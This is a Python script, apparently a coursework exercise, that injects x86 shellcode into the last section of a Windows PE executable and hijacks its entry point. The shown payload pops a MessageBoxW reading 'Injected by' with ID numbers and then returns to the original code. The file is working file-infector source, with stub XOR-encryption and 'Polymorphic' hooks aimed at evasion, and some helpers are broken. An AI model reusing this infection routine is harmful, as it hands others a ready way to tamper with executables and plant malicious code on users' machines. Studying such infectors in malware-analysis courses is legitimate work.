import pefile
import os
import mmap
import shutil
import struct
import Polymorphic


def get_message_box_w(pe):
    # Get the MessageBoxW
    address_of_message_box_w = None
    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        dll_name = entry.dll.decode('utf-8')
        if dll_name == "USER32.dll":
            for func in entry.imports:
                if func.name.decode('utf-8') == "MessageBoxW":
                    address_of_message_box_w = func.address

    if not address_of_message_box_w:
        print("[-] PE file not imported MessageBoxW")
        return False

    print("Address of MessageBoxW: ", hex(address_of_message_box_w))
    return address_of_message_box_w

# Get the info section about number of sections and last section


def get_info_section(pe):
    # Get some info about section
    number_of_sections = pe.FILE_HEADER.NumberOfSections
    return number_of_sections

# Align function


def align(value, alignment):
    return ((value+alignment-1) / alignment) * alignment

# Create payload


def create_shell_code(virtual_address_of_caption, virtual_address_of_text, jump_address, address_of_message_box_w):
    shell_code = b'\x6A\x00'
    shell_code += b'\x68' + struct.pack("I", virtual_address_of_caption)
    shell_code += b'\x68' + struct.pack("I", virtual_address_of_text)
    shell_code += b'\x6A\x00'
    shell_code += b'\xFF\x15'
    shell_code += struct.pack("I", address_of_message_box_w)
    shell_code += b'\xE9' + struct.pack("I", jump_address)
    shell_code += b'\x00' * 55
    shell_code += b'\x49\x00\x6e\x00\x66\x00\x6f\x00'
    shell_code += b'\x00' * 24
    shell_code += b'\x49\x00\x6E\x00\x6A\x00\x65\x00\x63\x00\x74\x00\x65\x00\x64\x00\x20\x00\x62\x00\x79\x00\x20\x00\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x36\x00\x33\x00\x39\x00\x20\x00\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x36\x00\x30\x00\x34\x00\x20\x00\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x36\x00\x31\x00\x37'

    return shell_code


def add_more_space(input, output):
    # Get original_size and add more space to file pe
    shutil.copy2(input, output)
    print("[*] Resize the Executable")

    original_size = os.path.getsize(output)
    print("\t[+] Original Size = ", hex(original_size))
    fd = open(output, 'a+b')
    map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
    map.resize(original_size + 0x1000)
    map.close()
    fd.close()

    print("\t[+] New Size = :", hex(os.path.getsize(output)))
    return original_size


def create_decryptor(raw_address_of_shell_code):
    return


def xor(a, b, c):
    # Execute the XOR
    return int(a) ^ int(b) ^ int(c)


def encrypted_payload(payload, raw_address_of_shell_code):
    # Encrypt payload using XOR
    len_payload = len(payload)
    encrypted_payload = xor(payload, raw_address_of_shell_code, len_payload)
    return encrypted_payload


def injected_shell_code(input, output):
    # Path to pe file

    original_size = add_more_space(input, output)
    pe = pefile.PE(output)
    raw_address_of_shell_code = original_size
    print("raw address shellcode: ", hex(raw_address_of_shell_code))
    number_of_sections = get_info_section(pe)

    # Get the last section
    last_section = pe.sections[-1]
    print("Last section info: ", last_section)

    # Get the image base and old entry points
    image_base = pe.OPTIONAL_HEADER.ImageBase
    entry_point_old = pe.OPTIONAL_HEADER.AddressOfEntryPoint

    # Calc the last section virtual offset and raw offset
    last_section_virtual_offset = last_section.VirtualAddress + \
        last_section.Misc_VirtualSize
    last_section_raw_offset = last_section.PointerToRawData + last_section.SizeOfRawData

    # Locate where to inject shell_code
    raw_address_of_caption = raw_address_of_shell_code + 0x50
    raw_address_of_text = raw_address_of_shell_code + 0x70

    # Calc X, Y, new entry point
    virtual_address_of_caption = raw_address_of_caption - \
        last_section.PointerToRawData + last_section.VirtualAddress + image_base
    virtual_address_of_text = raw_address_of_text - \
        last_section.PointerToRawData + last_section.VirtualAddress + image_base
    new_entry_point = raw_address_of_shell_code - \
        last_section.PointerToRawData + last_section.VirtualAddress + image_base

    # Calc old entry point
    entry_points_fix = new_entry_point - image_base
    jump_address = ((entry_point_old + image_base) - 5 -
                    (new_entry_point + 0x14)) & 0xffffffff
    print("jump entry: ", hex(jump_address))

    # Get the address of message box w
    address_of_message_box_w = get_message_box_w(pe)

    shell_code = create_shell_code(
        virtual_address_of_caption, virtual_address_of_text, jump_address, address_of_message_box_w)

    # Inject shell code
    print("\nShell-code : ")
    print(shell_code)

    print("Inject shell_code at : ", hex(raw_address_of_shell_code))
    print("Inject Caption at: ", hex(raw_address_of_caption))
    print("Inject text at: ", hex(raw_address_of_text))
    pe.set_bytes_at_offset(raw_address_of_shell_code, shell_code)

    # Resize VirtualSize and RawData
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = entry_points_fix
    last_section.Misc_VirtualSize += 0x1000
    last_section.SizeOfRawData += 0x1000
    pe.OPTIONAL_HEADER.SizeOfImage += 0x1000

    pe.write(output)
    print("Inject Successfully!!")
